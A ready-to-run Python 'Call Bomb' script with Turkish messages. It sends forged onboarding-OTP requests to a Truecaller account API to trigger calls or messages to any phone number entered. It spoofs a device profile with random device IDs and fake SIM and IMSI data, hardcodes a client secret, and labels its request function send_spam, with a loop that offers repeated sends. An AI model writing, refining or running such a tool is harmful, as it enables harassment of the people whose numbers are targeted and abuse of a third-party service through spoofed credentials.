import subprocess
import sys
import random
import hashlib
import time
import os
import re

def install_requests():
    try:
        import requests
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        import requests
    return requests

requests = install_requests()

# Ekranı temizle
os.system('cls' if os.name == 'nt' else 'clear')

print()
print("          /`·.¸")
print("         /¸...¸`:·")
print("     ¸.·´  ¸   `·.¸.·´)")
print("    : © ):´;      ¸  {")
print("     `·.¸ `·  ¸.·´\\`·¸)")
print("         `\\´´\\¸.·´")
print()
print("===================================")
print("   Call Bomb - by fatiqueos")
print("===================================")

print("\nUyarı: Her numaraya günde sadece 3 arama yapılabilir. Farklı numaralar için de aynı sınırlama geçerlidir.")
print("Lütfen bu sınırlamaları dikkate alarak işlem yapınız.")
print()

asa = '123456789'
gigk = ''.join(random.choice(asa) for i in range(10))
md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]

clientsecret = 'lvc22mp3l1sfv6ujg83rd17btt'
user_agent = 'Truecaller/12.34.8 (Android;8.1.2)'
accept_encoding = 'gzip'
content_length = '680'
content_type = 'application/json; charset=UTF-8'
Host = 'account-asia-south1.truecaller.com'
headers = dict(zip(('clientsecret', 'user-agent', 'accept-encoding', 'content-length', 'content-type', 'Host'), 
                   (clientsecret, user_agent, accept_encoding, content_length, content_type, Host)))

url = 'https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp'

def send_spam(phone_number):
    data = ('{"countryCode":"eg","dialingCode":20,"installationDetails":{"app":{"buildVersion":8,"majorVersion":12,'
            '"minorVersion":34,"store":"GOOGLE_PLAY"},"device":{"deviceId":"' + md5 + '","language":"ar",'
            '"manufacturer":"Xiaomi","mobileServices":["GMS"],"model":"Redmi Note 8A Prime","osName":"Android",'
            '"osVersion":"7.1.2","simSerials":["8920022021714943876f","8920022022805258505f"]},"language":"ar",'
            '"sims":[{"imsi":"602022207634386","mcc":"602","mnc":"2","operator":"vodafone"},{"imsi":"602023133590849",'
            '"mcc":"602","mnc":"2","operator":"vodafone"}],"storeVersion":{"buildVersion":8,"majorVersion":12,'
            '"minorVersion":34}},"phoneNumber":"' + phone_number + '","region":"region-2","sequenceNo":1}')
    response = requests.post(url, headers=headers, data=data)
    if response.status_code == 200:
        print("İşlem başarıyla tamamlandı.")
    else:
        print('Arama gönderilemedi.')

def is_valid_phone_number(number):
    pattern = re.compile(r'^\+\d{11,15}$')
    return pattern.match(number)

def main():
    while True:
        phone_number = input("Örnek no: +905555555555 : ")
        if not is_valid_phone_number(phone_number):
            print("Geçersiz numara formatı. Lütfen doğru formatta bir numara girin.")
            continue
        
        send_spam(phone_number)
        time.sleep(1)
        
        again = input("Tekrar göndermek ister misiniz? (Y/N): ").strip().lower()
        if again != 'y':
            print("Program kapatılıyor.")
            break

if __name__ == "__main__":
    main()
